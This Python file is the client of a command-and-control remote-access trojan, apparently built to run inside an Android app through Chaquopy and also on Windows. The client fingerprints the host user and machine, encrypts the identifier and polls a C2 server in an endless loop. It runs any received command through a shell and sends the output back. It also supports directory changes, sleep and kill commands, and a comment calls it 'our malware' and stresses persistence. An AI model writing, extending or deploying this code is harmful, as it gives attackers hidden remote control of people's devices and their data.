# For both Windows and Linux/Android builds (cross-platform compatibility)
from time import time, sleep
from requests import get, post, exceptions
from subprocess import run, PIPE, STDOUT
from encryption import cipher
from settings import PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER

# For Android/Linux (Linux-like) - Cross-platform import
import os
import platform  # Built-in fallback for non-Linux

# For a Linux/Android OS, obtain unique identifying information
try:
    # Try uname for Linux/Android
    client = (os.getenv("LOGNAME", "android") + "@" + os.uname().nodename + "@" + str(time()))
except AttributeError:
    # Fallback for Windows/other
    client = (os.getenv("USERNAME", "Unknown_Username") + "@" + os.getenv("COMPUTERNAME", "Unknown_Computername") + "@" + str(time()))

print(f"DEBUG: Client ID created: {client}")  # Log for debugging (Logcat on Android)

# UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encryption
encrypted_client = cipher.encrypt(client.encode()).decode()
print(f"DEBUG: Encrypted client ID: {encrypted_client[:50]}...")  # Partial log for security

def post_to_server(message: str, response_path=RESPONSE):
    """ Function to encrypt data and then post it to the c2 server. Accepts a message and a response path (optional) as arguments."""
    try:
        # Byte encode the message and then encrypt it before posting
        encrypted_message = cipher.encrypt(message.encode())
        url = f"http://{C2_SERVER}:{PORT}{response_path}"
        print(f"DEBUG: Posting to {url}")  # Log URL for debugging
        
        response = post(url, data={RESPONSE_KEY: encrypted_message},
                        headers=HEADER, proxies=PROXY)  # No timeout as requested
        print(f"DEBUG: POST status: {response.status_code}")  # Log response
        return response.status_code == 200  # Return success flag
    except exceptions.RequestException as e:
        print(f"DEBUG: POST error: {str(e)}")  # Log error
        return False

def main():
    """ Main loop for Chaquopy call from Java - with improved error handling, no timeout """
    print("DEBUG: Starting main loop")  # Confirm start
    # Try an HTTP GET request to the c2 server and retrieve a command; if it fails, keep trying forever
    while True:
        try:
            url = f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}"
            print(f"DEBUG: GET request to {url}")  # Log URL for debugging
            
            response = get(url, headers=HEADER, proxies=PROXY)  # No timeout as requested
            print(f"Status: {response.status_code}")  # Log to Android Logcat
            # If we get a 404 status code from the server, raise an exception
            if response.status_code == 404:
                raise exceptions.RequestException("Server not ready for this client")
        except exceptions.RequestException as e:
            print(f"DEBUG: GET error: {str(e)}")  # Log specific error
            sleep(DELAY)
            continue

        # Retrieve the command via the decrypted and decoded content of the response object
        try:
            command = cipher.decrypt(response.content).decode()
            print(f"DEBUG: Received command: {command}")  # Log command for debugging
        except Exception as e:
            print(f"DEBUG: Decrypt error: {str(e)}")
            sleep(DELAY)
            continue

        # If the command starts with 'cd ', slice out directory and chdir to it
        if command.startswith("cd "):
            directory = command[3:]
            try:
                os.chdir(directory)  # Use os.chdir for consistency
                print(f"DEBUG: Changed dir to {os.getcwd()}")
                post_to_server(os.getcwd(), CWD_RESPONSE)
            except FileNotFoundError:
                post_to_server(f"{directory} was not found.\n")
            except NotADirectoryError:
                post_to_server(f"{directory} is not a directory.\n")
            except PermissionError:
                post_to_server(f"You do not have permissions to access {directory}.\n")
            except OSError as e:
                post_to_server(f"OS error: {str(e)}\n")
                print(f"DEBUG: OS error in chdir: {str(e)}")
            else:
                pass  # Success handled above

        # The "client kill" command will shut down our malware; make sure we have persistence!
        elif command.startswith("client kill"):
            post_to_server(f"{client} has been killed.\n")
            print("DEBUG: Kill command received - exiting main loop")
            return  # Exit main() instead of exit() to not kill the entire app

        # The "client sleep SECONDS" command will silence our malware for a set amount of time
        elif command.startswith("client sleep "):
            try:
                parts = command.split()
                if len(parts) < 3:
                    raise IndexError("Missing delay value")
                delay_val = float(parts[2])
                if delay_val < 0:
                    raise ValueError("Negative delay")
            except (IndexError, ValueError) as e:
                post_to_server("You must enter in a positive number for the amount of time to sleep in seconds.\n")
                print(f"DEBUG: Sleep parse error: {str(e)}")
            else:
                post_to_server(f"{client} will sleep for {delay_val} seconds.\n")
                print(f"DEBUG: Sleeping for {delay_val}s")
                sleep(delay_val)
                post_to_server(f"{client} is now awake.\n")
                print("DEBUG: Awake after sleep")

        # Else, run our operating system command and send the output to the c2 server
        else:
            try:
                print(f"DEBUG: Executing command: {command}")  # Log before run
                command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout  # No timeout in run as requested
                output_str = command_output.decode('utf-8', errors='ignore')  # Safe decode
                print(f"DEBUG: Command output length: {len(output_str)} chars")
                post_to_server(output_str)
            except Exception as e:
                error_msg = f"Command execution error: {str(e)}\n"
                post_to_server(error_msg)
                print(f"DEBUG: Command error: {str(e)}")

        sleep(DELAY)  # Delay after command

if __name__ == "__main__":
    main()  # Run if called directly